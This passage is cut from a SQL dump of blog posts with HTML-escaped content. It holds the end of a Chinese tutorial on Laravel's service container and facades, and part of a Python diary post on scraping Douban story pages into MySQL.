class=\"language-css\">//&nbsp;创建一个容器（后面称作超级工厂）\r\n$container&nbsp;=&nbsp;new&nbsp;Container;\r\n&nbsp;\r\n//&nbsp;向该&nbsp;超级工厂&nbsp;添加&nbsp;超人&nbsp;的生产脚本\r\n$container-&gt;bind(&#39;superman&#39;,&nbsp;function($container,&nbsp;$moduleName)&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;new&nbsp;Superman($container-&gt;make($moduleName));\r\n});\r\n&nbsp;\r\n//&nbsp;向该&nbsp;超级工厂&nbsp;添加&nbsp;超能力模组&nbsp;的生产脚本\r\n$container-&gt;bind(&#39;xpower&#39;,&nbsp;function($container)&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;new&nbsp;XPower;\r\n});\r\n&nbsp;\r\n//&nbsp;同上\r\n$container-&gt;bind(&#39;ultrabomb&#39;,&nbsp;function($container)&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;new&nbsp;UltraBomb;\r\n});\r\n&nbsp;\r\n//&nbsp;******************&nbsp;&nbsp;华丽丽的分割线&nbsp;&nbsp;**********************\r\n//&nbsp;开始启动生产\r\n$superman_1&nbsp;=&nbsp;$container-&gt;make(&#39;superman&#39;,&nbsp;[&#39;xpower&#39;]);\r\n$superman_2&nbsp;=&nbsp;$container-&gt;make(&#39;superman&#39;,&nbsp;[&#39;ultrabomb&#39;]);\r\n$superman_3&nbsp;=&nbsp;$container-&gt;make(&#39;superman&#39;,&nbsp;[&#39;xpower&#39;]);\r\n//&nbsp;...随意添加</code></pre><p>看到没？通过最初的&nbsp;<span style=\"color: rgb(0, 176, 80);\">绑定（bind）</span>&nbsp;操作，我们向 超级工厂 注册了一些生产脚本，这些生产脚本在生产指令下达之时便会执行。发现没有？我们彻底的解除了 超人 与 超能力模组 的依赖关系，更重要的是，容器类也丝毫没有和他们产生任何依赖！我们通过注册、绑定的方式向容器中添加一段可以被执行的回调（可以是匿名函数、非匿名函数、类的方法）作为生产一个类的实例的&nbsp;脚本&nbsp;，只有在真正的&nbsp;<span style=\"color: rgb(0, 176, 80);\">生产（make）</span>&nbsp;操作被调用执行时，才会触发。</p><p>这样一种方式，使得我们更容易在创建一个实例的同时解决其依赖关系，并且更加灵活。当有新的需求，只需另外绑定一个“生产脚本”即可。</p><p>现在，到目前为止，我们已经不再惧怕怪兽们了。高智商人才集思广益，井井有条，根据接口契约创造规范的超能力模组。超人开始批量产出。最终，人人都是超人，你也可以是哦！</p><h2>回归正常世界。我们开始重新审视 laravel 的核心。</h2><p>现在，我们开始慢慢解读laravel的核心。其实，laravel的核心就是一个IoC容器，也恰好是我之前所说的高级的IoC容器。</p><p>可以说，laravel的核心本身十分轻量，并没有什么很神奇很实质性的应用功能。很多人用到的各种功能模块比如&nbsp;Route（路由）、Eloquent ORM（数据库 ORM 组件）、Request and Response（请求和响应）等等等等，实际上都是与核心无关的类模块提供的，这些类从注册到实例化，最终被你所使用，其实都是laravel的服务容器负责的。</p><p>我们以大家最常见的Route类作为例子。大家可能经常见到路由定义是这样的：</p><pre><code class=\"language-css\">Route::get(&#39;/&#39;,&nbsp;function()&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;bla&nbsp;bla&nbsp;bla...\r\n});</code></pre><p>实际上，&nbsp;Route类被定义在这个命名空间：Illuminate\\Routing\\Router，文件vendor/laravel/framework/src/Illuminate/Routing/Router.php。</p><p>我们通过打开发现，这个类的这一系列方法，如&nbsp;get，post，any&nbsp;等都不是静态（static）方法，这是怎么一回事儿？不要急，我们继续。</p><h3>服务提供者</h3><p>我们在前文介绍 IoC 容器的部分中，提到了，一个类需要绑定、注册至容器中，才能被“制造”。</p><p>对，一个类要被容器所能够提取，必须要先注册至这个容器。既然 laravel 称这个容器叫做服务容器，那么我们需要某个服务，就得先注册、绑定这个服务到容器，那么提供服务并绑定服务至容器的东西，就是<span style=\"color: rgb(0, 176, 80);\">服务提供者（ServiceProvider）</span>。</p><p>虽然，绑定一个类到容器不一定非要通过服务提供者（ServiceProvider）&nbsp;。</p><p>但是，我们知道，有时候我们的类、模块会有需要其他类和组件的情况，为了保证初始化阶段不会出现所需要的模块和组件没有注册的情况，laravel 将注册和初始化行为进行拆分，注册的时候就只能注册，初始化的时候就是初始化。拆分后的产物就是现在的服务提供者。</p><p>服务提供者主要分为两个部分，register（注册）&nbsp;和&nbsp;boot（引导、初始化），具体参考文档。register&nbsp;负责进行向容器注册“脚本”，但要注意注册部分不要有对未知事物的依赖，如果有，就要移步至&nbsp;boot&nbsp;部分。</p><p>我们现在解答之前关于&nbsp;Route&nbsp;的方法为何能以静态方法访问的问题。实际上这个问题文档上有写，简单说来就是模拟一个类，提供一个静态魔术方法__callStatic，并将该静态方法映射到真正的方法上。</p><p>我们使用的&nbsp;Route&nbsp;类实际上是&nbsp;Illuminate\\Support\\Facades\\Route&nbsp;通过class_alias()&nbsp;函数创造的&nbsp;别名&nbsp;而已，这个类被定义在文件vendor/laravel/framework/src/Illuminate/Support/Facades/Route.php&nbsp;。</p><pre><code class=\"language-css\">&lt;?php&nbsp;namespace&nbsp;Illuminate\\Support\\Facades;\r\n&nbsp;\r\n/**\r\n&nbsp;*&nbsp;@see&nbsp;\\Illuminate\\Routing\\Router\r\n&nbsp;*/\r\nclass&nbsp;Route&nbsp;extends&nbsp;Facade&nbsp;{\r\n&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;/**\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;Get&nbsp;the&nbsp;registered&nbsp;name&nbsp;of&nbsp;the&nbsp;component.\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@return&nbsp;string\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/\r\n&nbsp;&nbsp;&nbsp;&nbsp;protected&nbsp;static&nbsp;function&nbsp;getFacadeAccessor()\r\n&nbsp;&nbsp;&nbsp;&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;&#39;router&#39;;\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;\r\n}</code></pre><p>其实仔细看，会发现这个类继承了一个叫做&nbsp;Facade&nbsp;的类，到这里谜底差不多要解开了。</p><p>上述简单的定义中，我们看到了&nbsp;getFacadeAccessor&nbsp;方法返回了一个&nbsp;route，这是什么意思呢？事实上，这个值被一个&nbsp;ServiceProvider&nbsp;注册过，大家应该知道注册了个什么，当然是那个真正的路由类！</p><p>至此。</p><p><span style=\"color: rgb(255, 0, 0);\">原文链接：<a href=\"https://www.insp.top/article/learn-laravel-container\" target=\"_blank\" title=\"laravel 学习笔记 —— 神奇的服务容器\">laravel 学习笔记 —— 神奇的服务容器</a></span></p>',1458533858,'2016-10-14 08:46:02','0000-00-00 00:00:00',2,0,2,6,'http://lzxya.kssws.ks-cdn.com/image_1458533791318310.jpg?imageView2/1/w/210/h/140'),(119,0,'python','一只特立独行的猪2号','Python爬虫日记之爬取豆瓣故事到数据库','豆瓣故事算是我大学比较常去的一个社区了，所以...光荣的成为了我的练手对象哈哈，爬取过程主要先分析页面的url，然后将页面爬下来后分析页面的html，截取需要的信息保存到dict然后操作数据库保存数据！','用爬虫爬取豆瓣故事','爬取豆瓣故事的页面内容并存到数据库','豆瓣故事，爬虫','爬虫日记',282,'<p><img style=\"border-radius:4px\" src=\"http://lzxya.kssws.ks-cdn.com/image_1456883650734015.jpg@base@tag=imgScale&q=100&w=690\" title=\"1456883650734015.jpg\" alt=\"1.jpg\"/></p><p>豆瓣故事因为算是我大学比较常去的一个社区了，所以...光荣的成为了我的练手对象哈哈</p><h3>先分析url</h3><p><img src=\"http://lzxya.kssws.ks-cdn.com/image_1456883682592832.png@base@tag=imgScale&q=100&w=690\" title=\"1456883682592832.png\" alt=\"2.png\"/></p><p>先看图，第一种是选择的某种故事（就是上图中的事情）的首页链接</p><p>例如&nbsp;<span style=\"color: rgb(0, 112, 192);\">thing.douban.com/subject/631/&nbsp;</span>其中<span style=\"color: rgb(255, 0, 0);\">631<span style=\"color: rgb(0, 0, 0);\">就是它的ID，所以爬取不同的事情只要传入ID就可以啦</span></span></p><p><span style=\"color: rgb(0, 0, 0);\">然后组成要爬取的url：<span style=\"color: rgb(0, 112, 192);\">thing.douban.com/subject/631/experience/?p=2&amp;order=hot&nbsp;<span style=\"color: rgb(0, 0, 0);\">解释一下，这里面p=2也就是页数，order=hot也就是按照最热来排序所以631和2就是要传的值，具体代码里面分析...</span></span></span></p><p><span style=\"color: rgb(0, 0, 0);\"><span style=\"color: rgb(0, 112, 192);\"><span style=\"color: rgb(0, 0, 0);\">代码分为两个文件page.py和mysql.py</span></span></span></p><h3>这是page.py的代码</h3><pre><code class=\"language-css\">#&nbsp;-*-&nbsp;coding:utf-8&nbsp;-*-\r\nfrom&nbsp;urllib&nbsp;import&nbsp;request,&nbsp;parse\r\n#from&nbsp;bs4&nbsp;import&nbsp;BeautifulSoup\r\nimport&nbsp;mysql\r\nimport&nbsp;time\r\nimport&nbsp;re\r\nimport&nbsp;sys\r\n\r\nclass&nbsp;Page(object):\r\n\r\n&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;__init__(self,subject):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.total_num&nbsp;=&nbsp;&quot;&quot;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.subject&nbsp;=&nbsp;str(subject)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.Mysqldb&nbsp;=&nbsp;mysql.tomysql()\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.Table&nbsp;=&nbsp;&quot;doubansj&quot;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;getCurrentDate(self):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;time.strftime(&#39;%Y-%m-%d&#39;,time.localtime(time.time()))\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;getCurrentTime(self):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;time.strftime(&#39;[%Y-%m-%d&nbsp;%H:%M:%S]&#39;,time.localtime(time.time()))\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;getPageByURL(self,url):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;requestUrl&nbsp;=&nbsp;request.Request(url)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;response&nbsp;=&nbsp;request.urlopen(requestUrl)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;response.read().decode(&quot;utf-8&quot;,&#39;ignore&#39;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except&nbsp;request.URLError&nbsp;as&nbsp;e:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;hasattr(&quot;e&quot;,&quot;code&quot;):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(self.getCurrentTime(),u&quot;获取页面失败1，原因&quot;,e.code)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;None\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;hasattr(&quot;e&quot;,&quot;reason&quot;):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(self.getCurrentTime(),u&quot;获取页面失败2，原因&quot;,e.reason)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;None\r\n&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;#提取内容页面数据，这里没用BeautifulSoup是我觉得还是正则方便点.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;getPageContent(self,url):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ContentOne&nbsp;=&nbsp;{}\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;page&nbsp;=&nbsp;self.getPageByURL(url)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#Htmlsoup&nbsp;=&nbsp;BeautifulSoup(page,&quot;lxml&quot;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#self.ContentData[&#39;title&#39;]&nbsp;=&nbsp;Htmlsoup.head.title.string.strip()\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ContentOne[&#39;description&#39;]&nbsp;=&nbsp;self.getDescription(page)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pattern&nbsp;=&nbsp;re.compile(&#39;&lt;div&nbsp;class=&quot;note-header.*?&lt;h1&gt;(.*?)&lt;/h1&gt;.*?note-author&quot;&gt;(.*?)&lt;/a&gt;.*?&lt;span&nbsp;class=&quot;pl&quot;&gt;(.*?)&lt;/span&gt;.*?&lt;span&nbsp;class=&quot;note-thing&quot;&gt;.*?&quot;&gt;(.*?)&lt;/a&gt;.*?link-report&quot;&gt;(.*?)&lt;/div&gt;&lt;/div&gt;&#39;,re.S)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;re.search(pattern,page)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;result:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ContentOne[&#39;title&#39;]&nbsp;=&nbsp;result.group(1).strip()\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ContentOne[&#39;author&#39;]&nbsp;=&nbsp;result.group(2).strip()\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ContentOne[&#39;datatime&#39;]&nbsp;=&nbsp;result.group(3).strip()\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ContentOne[&#39;tagclass&#39;]&nbsp;=&nbsp;result.group(4).strip()\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ContentOne[&#39;content&#39;]&nbsp;=&nbsp;self.ToolContent(result.group(5))\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(u&quot;没有获取数据！&quot;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;None\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;ContentOne\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;#清除文章中的链接以及将引号替换（否则sql会报错），这里也可以去掉图片链接\r\n&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;ToolContent(self,x):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;removeAddr&nbsp;=&nbsp;re.compile(&#39;&lt;a.*?&gt;|&lt;/a&gt;&#39;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;replaceLine&nbsp;=&nbsp;re.compile(&#39;&quot;&#39;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x&nbsp;=&nbsp;re.sub(removeAddr,&quot;&quot;,x)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x&nbsp;=&nbsp;re.sub(replaceLine,&quot;&#39;&quot;,x)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;x.strip()\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;getDescription(self,page):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pattern&nbsp;=&nbsp;re.compile(&#39;&lt;meta&nbsp;property=&quot;og:description&quot;.*?content=&quot;(.*?)&quot;&nbsp;/&gt;&#39;,re.S)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;re.search(pattern,page)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;result:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;result.group(1).strip()\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;None\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;getTotalPageNum(self):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(self.getCurrentTime(),u&quot;正在获取目录页面个数,请稍候...&quot;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;url&nbsp;=&nbsp;&#39;http://thing.douban.com/subject/&#39;+self.subject+&#39;/experience/?p=1&amp;order=hot&#39;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;page&nbsp;=&nbsp;self.getPageByURL(url)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pattern&nbsp;=&nbsp;re.compile(&#39;&lt;span&nbsp;class=&quot;thispage&quot;.*?page=&quot;(.*?)&quot;&gt;&#39;,re.S)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;re.search(pattern,page)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;result:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;result.group(1).strip()\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(self.getCurrentTime(),u&quot;获取总页面个数失败!&quot;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;None\r\n&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;#pageid就是爬第几页&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;getPagesUrl(self,pageid):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pageid&nbsp;=&nbsp;str(pageid)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;url&nbsp;=&nbsp;&#39;http://thing.douban.com/subject/&#39;+self.subject+&#39;/experience/?p=&#39;+pageid+&#39;&amp;order=hot&#39;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;page&nbsp;=&nbsp;self.getPageByURL(url)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pattern&nbsp;=&nbsp;re.compile(&#39;&lt;a&nbsp;target=.*?/note/(.*?)/&quot;&#39;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;items&nbsp;=&nbsp;[&#39;http://www.douban.com/note/&#39;+item&nbsp;for&nbsp;item&nbsp;in&nbsp;re.findall(pattern,page)]\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;not&nbsp;items:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;False\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ContentData&nbsp;=&nbsp;[]\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;k,item&nbsp;in&nbsp;enumerate(items):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(self.getCurrentTime(),u&quot;+-----正在爬取第&quot;,pageid,u&quot;页的第&quot;,(k+1),u&quot;篇内容&quot;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ContentOne&nbsp;=&nbsp;self.getPageContent(item)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ContentData.append(ContentOne)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;self.Mysqldb.insertData(self.Table,ContentData):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(self.getCurrentTime(),u&quot;第&quot;,pageid,u&quot;页内容成功加入数据库&quot;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;True\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;False\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;main(self):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#f_handler&nbsp;=&nbsp;open(&#39;out.log&#39;,&#39;w&#39;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#sys.stdout&nbsp;=&nbsp;f_handler\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;page&nbsp;=&nbsp;open(&#39;page.txt&#39;,&#39;r&#39;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;content&nbsp;=&nbsp;page.readline()\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;start_page&nbsp;=&nbsp;int(content.strip())\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;page.close()\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(self.getCurrentTime(),u&quot;开始页码&quot;,start_page)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.total_num&nbsp;=&nbsp;self.getTotalPageNum()\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(self.getCurrentTime(),u&quot;一共有&quot;,self.total_num,&quot;页,正在唤醒爬虫...&quot;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;not&nbsp;start_page:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;start_page&nbsp;=&nbsp;1\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;x&nbsp;in&nbsp;range(start_page,int(self.total_num)+1):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;self.getPagesUrl(x):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f&nbsp;=&nbsp;open(&#39;page.txt&#39;,&#39;w&#39;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.write(str(x))\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(self.getCurrentTime(),u&quot;已写入新页码&quot;,x)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.close()\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(self.getCurrentTime(),u&quot;添加失败，未写入页码&quot;,x)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except&nbsp;Exception&nbsp;as&nbsp;e:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&